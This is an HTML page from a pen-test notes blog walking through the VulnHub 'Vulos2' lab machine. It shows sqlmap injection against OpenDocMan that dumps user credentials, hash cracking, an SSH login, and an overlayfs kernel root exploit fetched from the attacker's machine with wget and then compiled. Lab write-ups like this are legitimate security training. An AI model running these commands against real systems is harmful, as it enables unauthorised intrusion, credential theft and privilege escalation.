@@ -1,0 +1,334 @@
+
+<!DOCTYPE HTML>
+<html>
+<head>
+	<script data-cfasync="false" type="text/javascript" src="//use.typekit.net/axj3cfp.js"></script>
+	<script data-cfasync="false" type="text/javascript">try{Typekit.load();}catch(e){}</script>
+	<meta charset="utf-8">
+	<title>vulos2  | Bob1Bob2</title>
+
+<meta name="author" content="Bob1Bob2"> 
+
+<meta name="description" content="Tools: netdiscover
+Nmap
+Wfuzz
+Nikto
+sqlmap
+hash-identifier Vulnerability: OpenDocMan 1.2.7 - Multiple Vulnerabilities
+Linux Kernel 3.13.0 &lt; 3.19 & &hellip;"> <meta name="keywords" content="">
+
+	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+	<link href="/atom.xml" rel="alternate" title="Bob1Bob2" type="application/atom+xml">
+	<link rel="canonical" href="">
+	<link href="/favicon.png" rel="shortcut icon">
+	<link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+	<link href="/stylesheets/font-awesome.min.css" rel="stylesheet" type="text/css">
+	<!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+	<script src="//ajax.googleapis.com/ajax/libs/jquery/1.7.2/jquery.min.js"></script>
+	<script type="text/javascript" src="/javascripts/jquery.fancybox.pack.js"></script>
+
+<script language="Javascript" type="text/javascript">
+$(document).ready(
+  function() {
+    (function($) {
+      $(".fancybox[data-content-id]").each(function() {
+        this.href = $(this).data('content-id');
+      });
+      $(".fancybox").fancybox({
+        beforeLoad: function() {
+          var el, 
+              id = $(this.element).data('title-id');
+
+          if (id) {
+            el = $('#' + id);
+
+            if (el.length) {
+              this.title = el.html();
+            }
+          }
+          if ($(this).data('content')) {
+            this.content = $(this).data('content');
+          }
+        },
+        helpers: {
+          title: {
+            type: 'inside'
+          }
+        }
+      });
+    })(jQuery);
+  }
+);
+</script>
+
+	
+</head>
+
+
+
+<body>
+	<header id="header" class="inner"><h1><a href="/">Bob1Bob2</a></h1>
+<h4>Pen Test Notes</h4>
+<nav id="main-nav"><ul>
+	<li><a href="/">Blog</a></li>
+	<li><a href="/about">About</a></li>
+	<li><a href="/portfolio">Portfolio</a></li>
+	<li><a href="/archives">Archive</a></li>
+</ul>
+</nav>
+<nav id="mobile-nav">
+	<div class="alignleft menu">
+		<a class="button">Menu</a>
+		<div class="container"><ul>
+	<li><a href="/">Blog</a></li>
+	<li><a href="/about">About</a></li>
+	<li><a href="/portfolio">Portfolio</a></li>
+	<li><a href="/archives">Archive</a></li>
+</ul>
+</div>
+	</div>
+	<div class="alignright search">
+		<a class="button"></a>
+		<div class="container">
+			<form action="https://www.google.com/search" method="get">
+				<input type="text" name="q" results="0">
+				<input type="hidden" name="q" value="site:wg135.github.io">
+			</form>
+		</div>
+	</div>
+</nav>
+
+
+</header>
+
+	<div id="content" class="inner"><article class="post">
+	<h2 class="title">Vulos2</h2>
+	<div class="entry-content"><h3>Tools:</h3>
+
+<ul>
+<li>netdiscover</li>
+<li>Nmap</li>
+<li>Wfuzz</li>
+<li>Nikto</li>
+<li>sqlmap</li>
+<li>hash-identifier</li>
+</ul>
+
+
+<h3>Vulnerability:</h3>
+
+<ul>
+<li><a href="https://www.exploit-db.com/exploits/32075/">OpenDocMan 1.2.7 - Multiple Vulnerabilities</a></li>
+<li><a href="https://www.exploit-db.com/exploits/37293/">Linux Kernel 3.13.0 &lt; 3.19 &lsquo;overlayfs&rsquo; Local Root Shell</a></li>
+</ul>
+
+
+<!--more-->
+
+
+<p>Use netdiscover to detect target IP address</p>
+
+<p><code>netdiscover -i eth0 -r 192.168.56.0/24</code></p>
+
+<p><img src="/images/blog/vulhub/vulos2/Selection_001.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>192.168.56.104 is the target.</p>
+
+<p>Then run nmap to detect opening ports and running services on the target machine.</p>
+
+<p><code>nmap -sV -v -O -A -T5 192.168.79.104 -p-</code></p>
+
+<p><img src="/images/blog/vulhub/vulos2/Selection_002.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>port 22, 80 and 6667 are opening.</p>
+
+<p>use wfuzz to scan. Nothing interesting.</p>
+
+<p>use Niko to scan. Same.</p>
+
+<p>Check the webpage, looks like a link may be useful.</p>
+
+<p><img src="/images/blog/vulhub/vulos2/Selection_003.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>Double click it.</p>
+
+<p><img src="/images/blog/vulhub/vulos2/Selection_004.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>Exam the links. In <code>Document</code>, I found this:</p>
+
+<p><img src="/images/blog/vulhub/vulos2/Selection_005.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>Looks like path <code>/jabcd0cs/</code> is available.</p>
+
+<p>go to  <code>http://192.168.56.104/jabcd0cs/</code>, I found the app is OpenDocMan v1.2.7.</p>
+
+<p><img src="/images/blog/vulhub/vulos2/Selection_006.png" title="[title manually exploit [alt text]]" ></p>
+
+<p><code>searchsploit opendocman</code></p>
+
+<p><img src="/images/blog/vulhub/vulos2/Selection_007.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>got the exploit. Try the sql injection vulnerability:</p>
+
+<p><img src="/images/blog/vulhub/vulos2/Selection_008.png" title="[title manually exploit [alt text]]" ></p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>sqlmap -u "http://192.168.56.104/jabcd0cs/ajax_udf.php?q=1&add_value=odm_user" --level=5 --risk=3</span></code></pre></td></tr></table></div></figure>
+
+
+<p><img src="/images/blog/vulhub/vulos2/Selection_009.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>Now I know the database type is MySQL.</p>
+
+<p>Next try to dump all table names</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>sqlmap -u "http://192.168.56.104/jabcd0cs/ajax_udf.php?q=1&add_value=odm_user" --tables --dbms=mysql</span></code></pre></td></tr></table></div></figure>
+
+
+<p><img src="/images/blog/vulhub/vulos2/Selection_010.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>looks like <code>odm_user</code> is the table I want to take a look at.</p>
+
+<p>now dump columns from table <code>odm_user</code></p>
+
+<p><code>sqlmap -u "http://192.168.56.104/jabcd0cs/ajax_udf.php?q=1&amp;add_value=odm_user" -T odm_user  --columns --dbms=mysql</code></p>
+
+<p><img src="/images/blog/vulhub/vulos2/Selection_011.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>looks like <code>username</code> and <code>password</code></p>
+
+<p>now time to dump all content from <code>username</code> and <code>password</code>,</p>
+
+<p><code>sqlmap -u "http://192.168.56.104/jabcd0cs/ajax_udf.php?q=1&amp;add_value=odm_user" -C username,password --dump --dbms=mysql</code></p>
+
+<p><img src="/images/blog/vulhub/vulos2/Selection_012.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>use hash-identifier to detect hash type</p>
+
+<p><img src="/images/blog/vulhub/vulos2/Selection_013.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>looks like they are MD5.</p>
+
+<p>use hashcat to crack it</p>
+
+<p><code>hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt</code></p>
+
+<p><img src="/images/blog/vulhub/vulos2/Selection_014.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>only guest&rsquo;s password is cracked.</p>
+
+<p>Find a very good website to crack MD5 online <a href="http://md5cracker.org/,">http://md5cracker.org/,</a> get the cracked password <code>webmin1980</code> for user webmin, and login:</p>
+
+<p><img src="/images/blog/vulhub/vulos2/Selection_015.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>not very helpful.</p>
+
+<p>Try to ssh to the box using webmin</p>
+
+<p><img src="/images/blog/vulhub/vulos2/Selection_016.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>get the bash:</p>
+
+<p><code>python -c 'import pty; pty.spawn("/bin/bash")'</code></p>
+
+<p>first check the os version</p>
+
+<p><code>uname -a</code></p>
+
+<p><img src="/images/blog/vulhub/vulos2/Selection_017.png" title="[title manually exploit [alt text]]" ></p>
+
+<p><code>searchsploit 3.13.0</code></p>
+
+<p><img src="/images/blog/vulhub/vulos2/Selection_018.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>try this exploit</p>
+
+<p>in Kali:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>cp /usr/share/exploitdb/platforms/linux/local/37292.c /var/www/html/.
+</span><span class='line'>service apache2 restart
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>in target:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>wget http://192.168.56.101/37292.c .
+</span><span class='line'>gcc 37292.c -o 37292
+</span><span class='line'>./37292</span></code></pre></td></tr></table></div></figure>
+
+
+<p><img src="/images/blog/vulhub/vulos2/Selection_019.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>DONE</p>
+</div>
+
+
+<div class="meta">
+	<div class="date">
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2016-07-20T13:36:54-05:00" pubdate data-updated="true">2016-07-20 13:36:54 -0500</time></div>
+	
+
+<div class="tags">
+
+	<a class='category' href='/blog/categories/opendocman/'>opendocman</a>, <a class='category' href='/blog/categories/vulhub/'>vulhub</a>
+
+</div>
+
+
+	
+</div></article>
+
+	<div class="share">
+	<div class="addthis_toolbox addthis_default_style ">
+	
+	
+	<a class="addthis_button_tweet"></a>
+	
+	
+<!---	<a class="addthis_counter addthis_pill_style"></a> --->
+	</div>
+  <script type="text/javascript" src="http://s7.addthis.com/js/250/addthis_widget.js#pubid="></script>
+</div>
+
+
+</div>
+	<footer id="footer" class="inner">Copyright &copy; 2017
+
+    Bob1Bob2
+
+<br>
+Powered by Octopress.
+</footer>
+	<script src="/javascripts/slash.js"></script>
+<script src="/javascripts/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+	$('.fancybox').fancybox();
+})(jQuery);
+</script> <!-- Delete or comment this line to disable Fancybox -->
+
+
+
+
+
+
+</body>
+</html>
